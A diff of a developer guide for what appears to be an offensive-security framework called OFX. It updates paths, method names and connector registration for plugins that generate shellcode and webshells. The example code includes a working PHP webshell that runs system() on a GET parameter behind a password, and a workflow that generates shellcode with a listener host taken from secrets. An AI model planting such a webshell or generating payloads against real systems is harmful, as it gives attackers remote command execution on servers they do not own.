@@ -4,34 +4,42 @@ Quick guide to locate OFX data files and add custom shellcode/webshell connector
 
 ## Where data lives
 
-- Code ships with `data/shellcode`, `data/webshell`, `data/site`.
-- Programmatic lookup: `from ofx.settings import DATA_DIR`.
-- Check path: `python -c "from ofx.settings import DATA_DIR; print(DATA_DIR)"`.
+- Static assets ship inside the package (`ofx/data/...`).
+- Built-in connectors live under `ofx/api/exploitation/...`.
+- User extensions live under `~/.local/share/ofx/`.
+- Programmatic lookup:
+  - Built-in: `from ofx.settings import DATA_DIR`
+  - User data: `from ofx.settings import BASE_DATA_DIR`
+
+Check paths:
+```
+python -c "from ofx.settings import DATA_DIR, BASE_DATA_DIR; print(DATA_DIR); print(BASE_DATA_DIR)"
+```
 
 ## Shellcode connectors (new ones)
 
-1) Create a file in `src/ofx/data/shellcode/connectors/`.
-2) Subclass `ShellcodeConnector`; implement `generate()` and optionally `check_available()`.
+1) Create a file in `~/.local/share/ofx/shellcode/connectors/`.
+2) Subclass `ShellcodeConnector`; implement `generate()` and optionally `_check_availability()`.
 ```python
-from ofx.data.shellcode.connectors.base import ShellcodeConnector
+from ofx.api.exploitation.shellcode.connectors.base import ShellcodeConnector
 import shutil, subprocess
 
 class CustomShellcodeConnector(ShellcodeConnector):
     def __init__(self):
         super().__init__(name="custom-tool", description="My generator")
-    def check_available(self):
+    def _check_availability(self):
         return shutil.which("custom-tool") is not None
     def generate(self, arch: str, format: str = "raw", **kw) -> bytes:
         return subprocess.check_output(["custom-tool", "-a", arch, "-f", format])
 ```
-3) Register in `data/shellcode/connectors/__init__.py` via `CONNECTORS["custom-tool"] = CustomShellcodeConnector`.
+3) No manual registration needed; the registry auto-discovers connectors on startup.
 
 ## Webshell connectors (new ones)
 
-1) Add a file under `src/ofx/data/webshell/connectors/` and subclass `WebshellConnector`.
-2) Implement `generate(language, password, encoder, **kwargs)` and `check_available` if needed.
+1) Add a file under `~/.local/share/ofx/webshell/connectors/` and subclass `WebshellConnector`.
+2) Implement `generate(language, password, encoder, **kwargs)` and `_check_availability` if needed.
 ```python
-from ofx.data.webshell.connectors.base import WebshellConnector
+from ofx.api.exploitation.webshell.connectors.base import WebshellConnector
 
 class MinimalWebshellConnector(WebshellConnector):
     def __init__(self):
@@ -41,16 +49,16 @@ class MinimalWebshellConnector(WebshellConnector):
             raise ValueError("php only")
         return f"<?php if($_GET['p']!=='{password}')die(); system($_GET['cmd']); ?>"
 ```
-3) Register in `data/webshell/connectors/__init__.py` via `CONNECTORS["mini"] = MinimalWebshellConnector`.
+3) No manual registration needed; the registry auto-discovers connectors on startup.
 
 ## Using custom connectors
 
 ```python
-from ofx.data.shellcode.connectors import CONNECTORS as shellcode
-from ofx.data.webshell.connectors import CONNECTORS as webshell
+from ofx.api.exploitation.shellcode.connectors import get_connector as get_shellcode_connector
+from ofx.api.exploitation.webshell.connectors import get_connector as get_webshell_connector
 
-payload = shellcode["custom-tool"]().generate(arch="x64")
-php = webshell["mini"]().generate(language="php", password="s3cr3t")
+payload = get_shellcode_connector("custom-tool").generate(arch="x64")
+php = get_webshell_connector("mini").generate(language="php", password="s3cr3t")
 ```
 
 ### In Workflows
@@ -63,8 +71,8 @@ jobs:
     steps:
       - name: Generate shellcode
         run: |
-          from ofx.data.shellcode.connectors import CONNECTORS
-          connector = CONNECTORS["custom-tool"]()
+          from ofx.api.exploitation.shellcode.connectors import get_connector
+          connector = get_connector("custom-tool")
           shellcode = connector.generate(
             arch="x64",
             lhost="${{ secrets.lhost }}",
@@ -75,8 +83,8 @@ jobs:
       
       - name: Generate webshell
         run: |
-          from ofx.data.webshell.connectors import CONNECTORS
-          connector = CONNECTORS["advanced"]()
+          from ofx.api.exploitation.webshell.connectors import get_connector
+          connector = get_connector("advanced")
           code = connector.generate(
             language="php",
             password="${{ secrets.webshell_pass }}"
@@ -110,7 +118,7 @@ def generate(self, arch: str, **kwargs) -> bytes:
 Check for required tools/libraries:
 
 ```python
-def check_available(self) -> bool:
+def _check_availability(self) -> bool:
     """Check if required dependencies are available."""
     # Check for command-line tools
     if not shutil.which("required-tool"):
@@ -148,7 +156,9 @@ Create tests for your connectors:
 # tests/test_custom_connector.py
 
 import pytest
-from ofx.data.shellcode.connectors.custom_connector import CustomShellcodeConnector
+from ofx.api.exploitation.shellcode.connectors.custom_connector import (
+    CustomShellcodeConnector,
+)
 
 def test_connector_available():
     connector = CustomShellcodeConnector()
